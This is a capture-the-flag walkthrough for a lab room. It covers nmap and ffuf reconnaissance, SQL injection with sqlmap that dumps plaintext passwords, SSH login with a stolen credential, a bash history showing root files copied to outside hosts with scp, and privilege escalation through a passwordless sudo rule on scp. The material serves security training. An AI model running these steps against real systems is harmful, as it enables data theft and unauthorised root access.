# Room: Jurassic Park
Difficulty: Hard

I began scanning for open ports using nmap -sC -sV TARGET_IP and found 2 open ports

- -sC = default script
- -sV = version detection

Result:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c6:de:61:7f:c3:86:fe:e8:2d:f7:c1:46:5b:5d:0b:29 (RSA)
|   256 63:f8:5f:7b:e0:a0:a0:d1:5c:67:90:3a:c1:9b:67:a0 (ECDSA)
|_  256 48:fd:98:04:79:73:8e:6c:a2:df:6d:0f:ab:cd:d1:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Jarassic Park
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I started enumerating hidden directories using fuzzing
``` bash
ffuf -u http://TARGET_IP/FUZZ -w wordlist.txt
```

Result:

- delete
- index.php
- robots.txt

Inside delete:
``` html
New priv esc for Ubuntu??
Change MySQL password on main system!
```

Inside robots.txt:
``` html
Wubbalubbadubdub
```
Visiting /shop.php shows three packages. Upon clicking, I suspected the parameter id was vulnerable to SQL injection:
``` 
http://TARGET_IP/item.php?id=1
```
I tried adding ' on 1, and it returned:
``` html
access: PERMISSION DENIED...and...

YOU DIDN'T SAY THE MAGIC WORD!

Try SqlMap.. I dare you..
```
I captured the request through Burp Suite, saved it, and ran it on sqlmap:
``` bash
sqlmap -r file_name --dbs
```
Response:
``` bash
GET parameter 'id' is vulnerable. Do you want to keep testing the others?
```
Available databases [5]:
``` bash
[*] information_schema
[*] mysql
[*] park
[*] performance_schema
[*] sys
```
### Question 1: What is the name of the SQL database serving the shop information?
Answer: park

I tried to list available columns using:
``` bash
sqlmap -r file_name -D park --columns
```
Response:
``` bash
Database: park
Table: items
[5 columns]
+-------------+------------------+
| Column      | Type             |
+-------------+------------------+
| id          | int(11) unsigned |
| information | char(250)        |
| package     | varchar(11)      |
| price       | int(11)          |
| sold        | int(11)          |
+-------------+------------------+

Database: park
Table: users
[3 columns]
+----------+------------------+
| Column   | Type             |
+----------+------------------+
| id       | int(11) unsigned |
| password | varchar(11)      |
| username | varchar(11)      |
+----------+------------------+
```
### Question 2: How many columns does the table have?
Answer: 5

sqlmap also showed the system version which was 16.04

### Question 3: What is the system version?
Answer: Ubuntu 16.04

While running:
``` bash
sqlmap -r file_name -D park -T users --dump-all
```
I found a user named:
``` bash
“Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?”
```
### Possible username: Dennis
Result:
``` bash
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | D0nt3ATM3 |          |
| 2  | ih8dinos  |          |
+----+-----------+----------+
```
Found Dennis's password: ih8dinos

I tried accessing SSH using his credentials, and it worked!

Now we have to find the flags.

I ran:
``` bash
find / -name "*flag*.txt" 2>/dev/null
```
to list the flags:
``` bash
/home/dennis/flag1.txt
/boot/grub/fonts/flagTwo.txt
```
After several attempts to search for flag3, I tried reading Dennis’s .bash_history:
``` bash
cat .bash_history

Flag3:b49***
```
I also found this at the bottom:
``` bash
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@88.104.10.206:~/
sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
```
sudo -l reveals:
``` bash
(ALL) NOPASSWD: /usr/bin/scp
```
This was interesting because I can transfer the flag5.txt from root using scp

I transferred it to /tmp:
```
sudo scp /root/flag5.txt /tmp
```
flag5.txt:
``` bash
cat /tmp/flag5.txt
```

